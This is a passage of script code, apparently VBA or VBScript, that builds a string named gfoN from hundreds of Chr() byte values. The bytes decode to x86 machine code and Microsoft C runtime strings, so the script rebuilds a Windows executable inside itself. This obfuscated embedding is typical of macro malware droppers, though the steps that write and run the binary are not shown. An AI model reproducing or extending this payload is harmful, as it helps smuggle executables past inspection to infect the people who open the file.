gfoN=gfoN&Chr(185)&Chr(172)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(126)&Chr(23)&Chr(141)&Chr(69)&Chr(236)&Chr(80)&Chr(15)&Chr(182)&Chr(195)&Chr(106)&Chr(8)&Chr(80)&Chr(232)&Chr(6)&Chr(252)&Chr(255)&Chr(255)&Chr(139)&Chr(77)&Chr(236)&Chr(131)&Chr(196)&Chr(12)&Chr(235)&Chr(16)&Chr(139)&Chr(145)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(182)&Chr(195)&Chr(15)&Chr(183)&Chr(4)&Chr(66)&Chr(131)&Chr(224)&Chr(8)&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(138)&Chr(31)&Chr(71)&Chr(235)&Chr(199)&Chr(128)&Chr(251)&Chr(45)&Chr(117)&Chr(6)&Chr(131)&Chr(77)&Chr(24)&Chr(2)&Chr(235)&Chr(5)&Chr(128)&Chr(251)&Chr(43)&Chr(117)&Chr(3)&Chr(138)&Chr(31)&Chr(71)&Chr(139)&Chr(69)&Chr(20)&Chr(133)&Chr(192)&Chr(15)&Chr(140)&Chr(75)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(132)&Chr(66)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(36)&Chr(15)&Chr(143)
gfoN=gfoN&Chr(57)&Chr(1)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(42)&Chr(128)&Chr(251)&Chr(48)&Chr(116)&Chr(9)&Chr(199)&Chr(69)&Chr(20)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(52)&Chr(138)&Chr(7)&Chr(60)&Chr(120)&Chr(116)&Chr(13)&Chr(60)&Chr(88)&Chr(116)&Chr(9)&Chr(199)&Chr(69)&Chr(20)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(33)&Chr(199)&Chr(69)&Chr(20)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(10)&Chr(131)&Chr(248)&Chr(16)&Chr(117)&Chr(19)&Chr(128)&Chr(251)&Chr(48)&Chr(117)&Chr(14)&Chr(138)&Chr(7)&Chr(60)&Chr(120)&Chr(116)&Chr(4)&Chr(60)&Chr(88)&Chr(117)&Chr(4)&Chr(71)&Chr(138)&Chr(31)&Chr(71)&Chr(139)&Chr(177)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(184)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(210)&Chr(247)&Chr(117)&Chr(20)&Chr(15)&Chr(182)&Chr(203)&Chr(15)&Chr(183)&Chr(12)&Chr(78)&Chr(246)&Chr(193)&Chr(4)
gfoN=gfoN&Chr(116)&Chr(8)&Chr(15)&Chr(190)&Chr(203)&Chr(131)&Chr(233)&Chr(48)&Chr(235)&Chr(27)&Chr(247)&Chr(193)&Chr(3)&Chr(1)&Chr(0)&Chr(0)&Chr(116)&Chr(49)&Chr(138)&Chr(203)&Chr(128)&Chr(233)&Chr(97)&Chr(128)&Chr(249)&Chr(25)&Chr(15)&Chr(190)&Chr(203)&Chr(119)&Chr(3)&Chr(131)&Chr(233)&Chr(32)&Chr(131)&Chr(193)&Chr(201)&Chr(59)&Chr(77)&Chr(20)&Chr(115)&Chr(25)&Chr(131)&Chr(77)&Chr(24)&Chr(8)&Chr(57)&Chr(69)&Chr(252)&Chr(114)&Chr(39)&Chr(117)&Chr(4)&Chr(59)&Chr(202)&Chr(118)&Chr(33)&Chr(131)&Chr(77)&Chr(24)&Chr(4)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(117)&Chr(35)&Chr(139)&Chr(69)&Chr(24)&Chr(79)&Chr(168)&Chr(8)&Chr(117)&Chr(32)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(116)&Chr(3)&Chr(139)&Chr(125)&Chr(12)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(235)&Chr(91)&Chr(139)&Chr(93)&Chr(252)&Chr(15)&Chr(175)&Chr(93)&Chr(20)&Chr(3)&Chr(217)&Chr(137)
gfoN=gfoN&Chr(93)&Chr(252)&Chr(138)&Chr(31)&Chr(71)&Chr(235)&Chr(139)&Chr(190)&Chr(255)&Chr(255)&Chr(255)&Chr(127)&Chr(168)&Chr(4)&Chr(117)&Chr(27)&Chr(168)&Chr(1)&Chr(117)&Chr(61)&Chr(131)&Chr(224)&Chr(2)&Chr(116)&Chr(9)&Chr(129)&Chr(125)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(119)&Chr(9)&Chr(133)&Chr(192)&Chr(117)&Chr(43)&Chr(57)&Chr(117)&Chr(252)&Chr(118)&Chr(38)&Chr(232)&Chr(114)&Chr(188)&Chr(255)&Chr(255)&Chr(246)&Chr(69)&Chr(24)&Chr(1)&Chr(199)&Chr(0)&Chr(34)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(6)&Chr(131)&Chr(77)&Chr(252)&Chr(255)&Chr(235)&Chr(15)&Chr(246)&Chr(69)&Chr(24)&Chr(2)&Chr(106)&Chr(0)&Chr(88)&Chr(15)&Chr(149)&Chr(192)&Chr(3)&Chr(198)&Chr(137)&Chr(69)&Chr(252)&Chr(139)&Chr(69)&Chr(16)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(137)&Chr(56)&Chr(246)&Chr(69)&Chr(24)&Chr(2)&Chr(116)&Chr(3)&Chr(247)&Chr(93)&Chr(252)&Chr(128)
gfoN=gfoN&Chr(125)&Chr(248)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(244)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(139)&Chr(69)&Chr(252)&Chr(235)&Chr(24)&Chr(139)&Chr(69)&Chr(16)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(137)&Chr(48)&Chr(128)&Chr(125)&Chr(248)&Chr(0)&Chr(116)&Chr(172)&Chr(139)&Chr(69)&Chr(244)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(51)&Chr(192)&Chr(91)&Chr(95)&Chr(94)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(51)&Chr(192)&Chr(80)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(57)&Chr(5)&Chr(148)&Chr(178)&Chr(64)&Chr(0)&Chr(117)&Chr(7)&Chr(104)&Chr(240)&Chr(169)&Chr(64)&Chr(0)&Chr(235)&Chr(1)&Chr(80)&Chr(232)&Chr(171)&Chr(253)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)
gfoN=gfoN&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(86)&Chr(83)&Chr(139)&Chr(77)&Chr(16)&Chr(11)&Chr(201)&Chr(116)&Chr(77)&Chr(139)&Chr(117)&Chr(8)&Chr(139)&Chr(125)&Chr(12)&Chr(183)&Chr(65)&Chr(179)&Chr(90)&Chr(182)&Chr(32)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(38)&Chr(10)&Chr(228)&Chr(138)&Chr(7)&Chr(116)&Chr(39)&Chr(10)&Chr(192)&Chr(116)&Chr(35)&Chr(131)&Chr(198)&Chr(1)&Chr(131)&Chr(199)&Chr(1)&Chr(58)&Chr(231)&Chr(114)&Chr(6)&Chr(58)&Chr(227)&Chr(119)&Chr(2)&Chr(2)&Chr(230)&Chr(58)&Chr(199)&Chr(114)&Chr(6)&Chr(58)&Chr(195)&Chr(119)&Chr(2)&Chr(2)&Chr(198)&Chr(58)&Chr(224)&Chr(117)&Chr(11)&Chr(131)&Chr(233)&Chr(1)&Chr(117)&Chr(209)&Chr(51)&Chr(201)&Chr(58)&Chr(224)&Chr(116)&Chr(9)&Chr(185)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(114)&Chr(2)&Chr(247)&Chr(217)&Chr(139)&Chr(193)&Chr(91)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(204)&Chr(204)&Chr(204)
gfoN=gfoN&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(86)&Chr(139)&Chr(68)&Chr(36)&Chr(20)&Chr(11)&Chr(192)&Chr(117)&Chr(40)&Chr(139)&Chr(76)&Chr(36)&Chr(16)&Chr(139)&Chr(68)&Chr(36)&Chr(12)&Chr(51)&Chr(210)&Chr(247)&Chr(241)&Chr(139)&Chr(216)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(247)&Chr(241)&Chr(139)&Chr(240)&Chr(139)&Chr(195)&Chr(247)&Chr(100)&Chr(36)&Chr(16)&Chr(139)&Chr(200)&Chr(139)&Chr(198)&Chr(247)&Chr(100)&Chr(36)&Chr(16)&Chr(3)&Chr(209)&Chr(235)&Chr(71)&Chr(139)&Chr(200)&Chr(139)&Chr(92)&Chr(36)&Chr(16)&Chr(139)&Chr(84)&Chr(36)&Chr(12)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(209)&Chr(233)&Chr(209)&Chr(219)&Chr(209)&Chr(234)&Chr(209)&Chr(216)&Chr(11)&Chr(201)&Chr(117)&Chr(244)&Chr(247)&Chr(243)&Chr(139)&Chr(240)&Chr(247)&Chr(100)&Chr(36)&Chr(20)&Chr(139)&Chr(200)&Chr(139)&Chr(68)&Chr(36)
gfoN=gfoN&Chr(16)&Chr(247)&Chr(230)&Chr(3)&Chr(209)&Chr(114)&Chr(14)&Chr(59)&Chr(84)&Chr(36)&Chr(12)&Chr(119)&Chr(8)&Chr(114)&Chr(15)&Chr(59)&Chr(68)&Chr(36)&Chr(8)&Chr(118)&Chr(9)&Chr(78)&Chr(43)&Chr(68)&Chr(36)&Chr(16)&Chr(27)&Chr(84)&Chr(36)&Chr(20)&Chr(51)&Chr(219)&Chr(43)&Chr(68)&Chr(36)&Chr(8)&Chr(27)&Chr(84)&Chr(36)&Chr(12)&Chr(247)&Chr(218)&Chr(247)&Chr(216)&Chr(131)&Chr(218)&Chr(0)&Chr(139)&Chr(202)&Chr(139)&Chr(211)&Chr(139)&Chr(217)&Chr(139)&Chr(200)&Chr(139)&Chr(198)&Chr(94)&Chr(194)&Chr(16)&Chr(0)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(139)&Chr(76)&Chr(36)&Chr(16)&Chr(11)&Chr(200)&Chr(139)&Chr(76)&Chr(36)&Chr(12)&Chr(117)&Chr(9)&Chr(139)&Chr(68)&Chr(36)&Chr(4)&Chr(247)&Chr(225)&Chr(194)&Chr(16)&Chr(0)&Chr(83)&Chr(247)&Chr(225)
gfoN=gfoN&Chr(139)&Chr(216)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(247)&Chr(100)&Chr(36)&Chr(20)&Chr(3)&Chr(216)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(247)&Chr(225)&Chr(3)&Chr(211)&Chr(91)&Chr(194)&Chr(16)&Chr(0)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(141)&Chr(66)&Chr(255)&Chr(91)&Chr(195)&Chr(141)&Chr(164)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(100)&Chr(36)&Chr(0)&Chr(51)&Chr(192)&Chr(138)&Chr(68)&Chr(36)&Chr(8)&Chr(83)&Chr(139)&Chr(216)&Chr(193)&Chr(224)&Chr(8)&Chr(139)&Chr(84)&Chr(36)&Chr(8)&Chr(247)&Chr(194)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(21)&Chr(138)&Chr(10)&Chr(131)&Chr(194)&Chr(1)&Chr(58)&Chr(203)&Chr(116)&Chr(207)&Chr(132)&Chr(201)&Chr(116)&Chr(81)&Chr(247)&Chr(194)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(235)&Chr(11)&Chr(216)&Chr(87)
gfoN=gfoN&Chr(139)&Chr(195)&Chr(193)&Chr(227)&Chr(16)&Chr(86)&Chr(11)&Chr(216)&Chr(139)&Chr(10)&Chr(191)&Chr(255)&Chr(254)&Chr(254)&Chr(126)&Chr(139)&Chr(193)&Chr(139)&Chr(247)&Chr(51)&Chr(203)&Chr(3)&Chr(240)&Chr(3)&Chr(249)&Chr(131)&Chr(241)&Chr(255)&Chr(131)&Chr(240)&Chr(255)&Chr(51)&Chr(207)&Chr(51)&Chr(198)&Chr(131)&Chr(194)&Chr(4)&Chr(129)&Chr(225)&Chr(0)&Chr(1)&Chr(1)&Chr(129)&Chr(117)&Chr(28)&Chr(37)&Chr(0)&Chr(1)&Chr(1)&Chr(129)&Chr(116)&Chr(211)&Chr(37)&Chr(0)&Chr(1)&Chr(1)&Chr(1)&Chr(117)&Chr(8)&Chr(129)&Chr(230)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(117)&Chr(196)&Chr(94)&Chr(95)&Chr(91)&Chr(51)&Chr(192)&Chr(195)&Chr(139)&Chr(66)&Chr(252)&Chr(58)&Chr(195)&Chr(116)&Chr(54)&Chr(132)&Chr(192)&Chr(116)&Chr(239)&Chr(58)&Chr(227)&Chr(116)&Chr(39)&Chr(132)&Chr(228)&Chr(116)&Chr(231)&Chr(193)&Chr(232)&Chr(16)&Chr(58)&Chr(195)&Chr(116)&Chr(21)
gfoN=gfoN&Chr(132)&Chr(192)&Chr(116)&Chr(220)&Chr(58)&Chr(227)&Chr(116)&Chr(6)&Chr(132)&Chr(228)&Chr(116)&Chr(212)&Chr(235)&Chr(150)&Chr(94)&Chr(95)&Chr(141)&Chr(66)&Chr(255)&Chr(91)&Chr(195)&Chr(141)&Chr(66)&Chr(254)&Chr(94)&Chr(95)&Chr(91)&Chr(195)&Chr(141)&Chr(66)&Chr(253)&Chr(94)&Chr(95)&Chr(91)&Chr(195)&Chr(141)&Chr(66)&Chr(252)&Chr(94)&Chr(95)&Chr(91)&Chr(195)&Chr(255)&Chr(37)&Chr(196)&Chr(128)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(150)&Chr(0)&Chr(0)&Chr(134)&Chr(150)&Chr(0)&Chr(0)&Chr(152)&Chr(150)&Chr(0)&Chr(0)&Chr(182)&Chr(150)&Chr(0)&Chr(0)&Chr(202)&Chr(150)&Chr(0)&Chr(0)&Chr(210)&Chr(150)&Chr(0)&Chr(0)&Chr(228)&Chr(150)&Chr(0)&Chr(0)&Chr(242)&Chr(150)&Chr(0)&Chr(0)&Chr(254)&Chr(150)&Chr(0)&Chr(0)&Chr(14)&Chr(151)&Chr(0)&Chr(0)&Chr(36)&Chr(151)&Chr(0)&Chr(0)&Chr(62)&Chr(151)&Chr(0)&Chr(0)&Chr(86)&Chr(151)&Chr(0)&Chr(0)&Chr(112)&Chr(151)&Chr(0)&Chr(0)&Chr(134)&Chr(151)&Chr(0)&Chr(0)&Chr(150)&Chr(151)&Chr(0)&Chr(0)&Chr(176)&Chr(151)&Chr(0)&Chr(0)&Chr(194)&Chr(151)&Chr(0)&Chr(0)&Chr(208)&Chr(151)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(232)&Chr(151)&Chr(0)&Chr(0)&Chr(246)&Chr(151)&Chr(0)&Chr(0)&Chr(2)&Chr(152)&Chr(0)&Chr(0)&Chr(16)&Chr(152)&Chr(0)&Chr(0)&Chr(26)&Chr(152)&Chr(0)&Chr(0)&Chr(50)&Chr(152)&Chr(0)&Chr(0)&Chr(66)&Chr(152)&Chr(0)&Chr(0)&Chr(88)&Chr(152)&Chr(0)&Chr(0)&Chr(112)&Chr(152)&Chr(0)&Chr(0)&Chr(126)&Chr(152)&Chr(0)&Chr(0)&Chr(140)&Chr(152)&Chr(0)&Chr(0)&Chr(152)&Chr(152)&Chr(0)&Chr(0)&Chr(178)&Chr(152)&Chr(0)&Chr(0)&Chr(194)&Chr(152)&Chr(0)&Chr(0)&Chr(216)&Chr(152)&Chr(0)&Chr(0)&Chr(242)&Chr(152)&Chr(0)&Chr(0)&Chr(10)&Chr(153)&Chr(0)&Chr(0)&Chr(34)&Chr(153)&Chr(0)&Chr(0)&Chr(54)&Chr(153)&Chr(0)&Chr(0)&Chr(74)&Chr(153)&Chr(0)&Chr(0)&Chr(102)&Chr(153)&Chr(0)&Chr(0)&Chr(122)&Chr(153)&Chr(0)&Chr(0)&Chr(138)&Chr(153)&Chr(0)&Chr(0)&Chr(178)&Chr(153)&Chr(0)&Chr(0)&Chr(190)&Chr(153)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(200)&Chr(153)&Chr(0)&Chr(0)&Chr(212)&Chr(153)&Chr(0)&Chr(0)&Chr(230)&Chr(153)&Chr(0)&Chr(0)&Chr(242)&Chr(153)&Chr(0)&Chr(0)&Chr(2)&Chr(154)&Chr(0)&Chr(0)&Chr(16)&Chr(154)&Chr(0)&Chr(0)&Chr(28)&Chr(154)&Chr(0)&Chr(0)&Chr(40)&Chr(154)&Chr(0)&Chr(0)&Chr(58)&Chr(154)&Chr(0)&Chr(0)&Chr(74)&Chr(154)&Chr(0)&Chr(0)&Chr(96)&Chr(154)&Chr(0)&Chr(0)&Chr(112)&Chr(154)&Chr(0)&Chr(0)&Chr(130)&Chr(154)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(167)&Chr(44)&Chr(64)&Chr(0)&Chr(5)&Chr(61)&Chr(64)&Chr(0)&Chr(10)&Chr(96)&Chr(64)&Chr(0)&Chr(246)&Chr(17)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(111)&Chr(114)&Chr(69)&Chr(120)&Chr(105)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(109)&Chr(0)&Chr(115)&Chr(0)&Chr(99)&Chr(0)&Chr(111)&Chr(0)&Chr(114)&Chr(0)&Chr(101)&Chr(0)&Chr(101)&Chr(0)&Chr(46)&Chr(0)&Chr(100)&Chr(0)&Chr(108)&Chr(0)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(114)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(0)&Chr(0)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(84)&Chr(76)&Chr(79)&Chr(83)&Chr(83)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(73)&Chr(78)&Chr(71)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(68)&Chr(79)&Chr(77)&Chr(65)
gfoN=gfoN&Chr(73)&Chr(78)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(52)&Chr(13)&Chr(10)&Chr(65)&Chr(110)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(104)&Chr(97)&Chr(115)&Chr(32)&Chr(109)&Chr(97)&Chr(100)&Chr(101)&Chr(32)&Chr(97)&Chr(110)&Chr(32)&Chr(97)&Chr(116)&Chr(116)&Chr(101)&Chr(109)&Chr(112)&Chr(116)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(108)&Chr(111)&Chr(97)&Chr(100)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(67)&Chr(32)&Chr(114)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(108)&Chr(105)&Chr(98)&Chr(114)&Chr(97)&Chr(114)&Chr(121)&Chr(32)&Chr(105)&Chr(110)&Chr(99)&Chr(111)&Chr(114)&Chr(114)&Chr(101)&Chr(99)&Chr(116)&Chr(108)&Chr(121)&Chr(46)
gfoN=gfoN&Chr(10)&Chr(80)&Chr(108)&Chr(101)&Chr(97)&Chr(115)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(116)&Chr(97)&Chr(99)&Chr(116)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(39)&Chr(115)&Chr(32)&Chr(115)&Chr(117)&Chr(112)&Chr(112)&Chr(111)&Chr(114)&Chr(116)&Chr(32)&Chr(116)&Chr(101)&Chr(97)&Chr(109)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(109)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(51)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(65)&Chr(116)&Chr(116)&Chr(101)&Chr(109)&Chr(112)&Chr(116)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(117)&Chr(115)&Chr(101)&Chr(32)
